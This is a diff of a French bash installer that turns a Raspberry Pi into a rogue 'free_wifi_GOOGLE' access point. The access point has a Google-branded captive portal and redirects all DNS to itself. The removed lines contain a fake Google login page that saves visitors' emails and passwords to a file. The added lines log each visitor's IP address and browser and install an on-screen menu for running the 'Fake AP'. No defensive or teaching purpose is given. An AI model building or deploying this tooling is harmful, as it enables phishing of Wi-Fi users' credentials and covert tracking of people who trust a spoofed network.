@@ -1,139 +1,165 @@
 #!/bin/bash
 
-# === CONFIGURATION ===
-INTERFACE_AP="wlan1"
-SSID_NAME="free_wifi_GOOGLE"
-DIR="/home/pi/pineapple"
-WWW="$DIR/www"
-CAPTURES="$DIR/captures"
+### === Installation du Wi-Fi Pineapple + Affichage SPI TFT === ###
 
-echo "[*] Installation des paquets nécessaires..."
-sudo apt-get update
-sudo apt-get install -y hostapd dnsmasq lighttpd php php-cgi php-cli
+set -e
 
-echo "[*] Création des répertoires..."
-mkdir -p "$WWW"
-mkdir -p "$CAPTURES"
+echo "[+] Mise à jour du système"
+apt update && apt install -y hostapd dnsmasq lighttpd php fbi fbterm git curl unzip
 
-# === LOGO GOOGLE ===
-cat > "$WWW/logo.svg" << 'EOF'
-<svg width="74" height="24" viewBox="0 0 74 24" xmlns="http://www.w3.org/2000/svg">
-<path fill="#4285F4" d="M9.5 10.5v3.4h5.5c-.2 1.2-.8 2.2-1.8 2.9l2.9 2.3c1.7-1.6 2.7-3.9 2.7-6.6 0-.5 0-.9-.1-1.3H9.5z"/>
-<path fill="#34A853" d="M9.5 17.5c1.6 0 2.9-.5 3.9-1.4l-2.9-2.3c-.6.4-1.4.7-2.3.7-1.8 0-3.4-1.2-3.9-2.9l-3 2.3c1 3 3.9 5.2 7.2 5.2z"/>
-<path fill="#FBBC05" d="M5.6 11.6c-.1-.4-.1-.8-.1-1.2s0-.8.1-1.2L2.6 6.9C1.9 8.3 1.5 9.9 1.5 11.6s.4 3.3 1.1 4.7l3-2.3z"/>
-<path fill="#EA4335" d="M9.5 5.2c1 0 1.9.3 2.6.9l2.4-2.4C13.1 2.3 11.4 1.5 9.5 1.5 6.2 1.5 3.3 3.7 2.6 6.9l3 2.3c.5-1.7 2.1-3 3.9-3z"/>
-</svg>
+echo "[+] Activation SPI et configuration écran 3.5'' TFT avec XPT2046"
+CONFIG_FILE="/boot/config.txt"
+grep -q "waveshare35b" $CONFIG_FILE || cat <<EOF >> $CONFIG_FILE
+
+# === Écran SPI 3.5" avec XPT2046 ===
+dtparam=spi=on
+dtoverlay=waveshare35b:rotate=270,speed=16000000,fps=25
+framebuffer_width=480
+framebuffer_height=320
 EOF
 
-# === PAGE D’ACCUEIL ===
-cat > "$WWW/index.php" << 'EOF'
+echo "[+] Installation des fichiers du portail captif"
+WEB_DIR="/var/www/html"
+mkdir -p $WEB_DIR
+cat <<EOF > $WEB_DIR/index.php
 <?php
-$logfile = "/home/pi/pineapple/captures/visits.log";
-$ip = $_SERVER['REMOTE_ADDR'];
-$agent = $_SERVER['HTTP_USER_AGENT'];
-$uri = $_SERVER['REQUEST_URI'];
-$time = date("Y-m-d H:i:s");
-file_put_contents($logfile, "$time - $ip - $uri - $agent\n", FILE_APPEND);
-
-if ($_SERVER["REQUEST_METHOD"] == "POST") {
-    $login = $_POST["login"];
-    $password = $_POST["password"];
-    $creds = date("Y-m-d H:i:s") . " - $login : $password\n";
-    file_put_contents("/home/pi/pineapple/captures/creds.txt", $creds, FILE_APPEND);
-    header("Location: loading.php");
-    exit;
-}
+file_put_contents("/var/log/pineapple.log", "[" . date("Y-m-d H:i:s") . "] Connexion: " . \$_SERVER['REMOTE_ADDR'] . " | UA: " . \$_SERVER['HTTP_USER_AGENT'] . "\n", FILE_APPEND);
 ?>
 <!DOCTYPE html>
 <html lang="fr">
 <head>
-  <meta charset="UTF-8">
-  <title>Connexion à free_wifi_GOOGLE</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <style>
-    body {background-color: #f2f2f2;font-family: 'Roboto', sans-serif;text-align: center;}
-    .container {margin-top: 100px; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 0 15px rgba(0,0,0,0.2);}
-    img {height: 30px; margin-bottom: 20px;}
-    input {padding: 10px; margin: 10px 0; width: 250px; border: 1px solid #ccc; border-radius: 4px; font-size: 14px;}
-    input[type="submit"] {background-color: #4285F4; color: white; border: none; cursor: pointer;}
-    .footer {margin-top: 40px; font-size: 12px; color: #aaa;}
-  </style>
+<meta charset="UTF-8">
+<title>Connexion Wi-Fi</title>
+<style>
+body {
+  background-color: #ffffff;
+  font-family: 'Roboto', sans-serif;
+  text-align: center;
+  margin-top: 10%;
+  color: #202124;
+}
+.spinner {
+  margin: 30px auto;
+  width: 60px;
+  height: 60px;
+  border: 6px solid #f3f3f3;
+  border-top: 6px solid #4285F4;
+  border-radius: 50%;
+  animation: spin 1s linear infinite;
+}
+@keyframes spin {
+  0% { transform: rotate(0deg); }
+  100% { transform: rotate(360deg); }
+}
+</style>
 </head>
 <body>
-  <div class="container">
-    <img src="logo.svg" alt="Google">
-    <h1>Connexion au réseau Wi-Fi</h1>
-    <p class="network-name">free_wifi_GOOGLE</p>
-    <p>Veuillez vous connecter avec votre compte Google pour accéder à Internet.</p>
-    <form method="POST">
-      <input type="text" name="login" placeholder="Adresse e-mail"><br>
-      <input type="password" name="password" placeholder="Mot de passe"><br>
-      <input type="submit" value="Se connecter">
-    </form>
-  </div>
-  <div class="footer">© Google Inc.</div>
+<img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo"><br><br>
+<h2>Connexion sécurisée à free_wifi_GOOGLE...</h2>
+<div class="spinner"></div>
 </body>
 </html>
 EOF
 
-# === PAGE DE REDIRECTION ===
-cat > "$WWW/loading.php" << 'EOF'
-<!DOCTYPE html>
-<html lang="fr">
-<head>
-  <meta charset="UTF-8">
-  <title>Connexion sécurisée...</title>
-  <meta http-equiv="refresh" content="3;url=https://www.google.com">
-  <style>
-    body {background-color: #fff; font-family: 'Roboto', sans-serif; text-align: center; margin-top: 120px; color: #555;}
-    .loader {border: 6px solid #f3f3f3; border-top: 6px solid #4285F4; border-radius: 50%; width: 50px; height: 50px; margin: 20px auto; animation: spin 1s linear infinite;}
-    @keyframes spin {0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); }}
-    p {font-size: 16px;}
-  </style>
-</head>
-<body>
-  <div class="loader"></div>
-  <p>Connexion sécurisée en cours...<br>Veuillez patienter.</p>
-</body>
-</html>
-EOF
-
-# === HOSTAPD ===
-cat > "$DIR/hostapd.conf" <<EOF
-interface=$INTERFACE_AP
-driver=nl80211
-ssid=$SSID_NAME
-hw_mode=g
-channel=6
-auth_algs=1
-ignore_broadcast_ssid=0
-EOF
-
-# === DNSMASQ ===
-cat > "$DIR/dnsmasq.conf" <<EOF
-interface=$INTERFACE_AP
-dhcp-range=10.0.0.10,10.0.0.50,12h
-dhcp-option=3,10.0.0.1
-dhcp-option=6,10.0.0.1
+echo "[+] Configuration de dnsmasq"
+cat <<EOF > /etc/dnsmasq.conf
+interface=wlan1
+dhcp-range=10.0.0.10,10.0.0.100,12h
 address=/#/10.0.0.1
-log-queries
-log-dhcp
 EOF
 
-# === CONFIGURATION RÉSEAU ===
-sudo ip link set $INTERFACE_AP down
-sudo ip addr flush dev $INTERFACE_AP
-sudo ip addr add 10.0.0.1/24 dev $INTERFACE_AP
-sudo ip link set $INTERFACE_AP up
+echo "[+] Configuration de hostapd"
+cat <<EOF > /etc/hostapd/hostapd.conf
+interface=wlan1
+ssid=free_wifi_GOOGLE
+channel=6
+driver=nl80211
+hw_mode=g
+auth_algs=1
+wmm_enabled=0
+EOF
 
-# === CONFIGURATION LIGHTTPD + PHP ===
-sudo lighttpd-enable-mod fastcgi-php
-sudo systemctl restart lighttpd
+sed -i 's|#DAEMON_CONF=.*|DAEMON_CONF="/etc/hostapd/hostapd.conf"|' /etc/default/hostapd
 
-# === DÉPLOIEMENT DES FICHIERS WEB ===
-sudo rm -rf /var/www/html/*
-sudo cp -r "$WWW"/* /var/www/html/
-sudo chmod -R 755 "$DIR" /var/www/html
-sudo chown -R www-data:www-data /var/www/html
+echo "[+] Configuration IP statique de wlan1"
+cat <<EOF >> /etc/dhcpcd.conf
 
-echo "[✔] Installation terminée. Utilise le menu pour démarrer l’attaque."
+interface wlan1
+    static ip_address=10.0.0.1/24
+EOF
+
+echo "[+] Activation Lighttpd"
+systemctl enable lighttpd
+systemctl restart lighttpd
+
+echo "[+] Ajout du splashscreen Pineapple"
+SPLASH="/usr/share/pineapple_splash.txt"
+cat <<EOF > $SPLASH
+************************************
+*   Connexion à free_wifi_GOOGLE   *
+*     Veuillez patienter...        *
+************************************
+EOF
+
+echo "[+] Configuration de lancement automatique du menu sur écran TFT"
+AUTOSTART="/etc/rc.local"
+if ! grep -q "pineapple_menu.sh" "$AUTOSTART"; then
+cat <<EOF >> $AUTOSTART
+
+# Rediriger console vers fb1 si dispo
+if [ -e /dev/fb1 ]; then
+  con2fbmap 1 1
+  clear
+  cat $SPLASH
+  sleep 2
+fi
+
+# Lancer le menu Pineapple
+/usr/local/bin/pineapple_menu.sh
+EOF
+fi
+
+echo "[+] Copie du menu interactif Pineapple"
+cat <<'EOF' > /usr/local/bin/pineapple_menu.sh
+#!/bin/bash
+while true; do
+  clear
+  echo "==== MENU PINEAPPLE ===="
+  echo "1. Démarrer le Fake AP"
+  echo "2. Arrêter le Fake AP"
+  echo "3. Afficher les connexions"
+  echo "4. Tester affichage écran TFT"
+  echo "0. Quitter"
+  echo "========================"
+  read -rp "Choix : " choix
+  case $choix in
+    1)
+      echo "[+] Démarrage du Fake AP..."
+      systemctl restart dnsmasq
+      systemctl restart hostapd
+      ;;
+    2)
+      echo "[+] Arrêt du Fake AP..."
+      systemctl stop dnsmasq
+      systemctl stop hostapd
+      ;;
+    3)
+      echo "[+] Connexions détectées :"
+      cat /var/log/pineapple.log
+      ;;
+    4)
+      echo "[+] Test affichage image sur fb1"
+      fbi -T 1 -d /dev/fb1 -noverbose /usr/share/raspberrypi-artwork/raspberry-pi-logo.png
+      ;;
+    0)
+      exit 0
+      ;;
+    *)
+      echo "Choix invalide"; sleep 1 ;;
+  esac
+done
+EOF
+
+chmod +x /usr/local/bin/pineapple_menu.sh
+
+echo "[+] Installation terminée. Redémarrage recommandé."
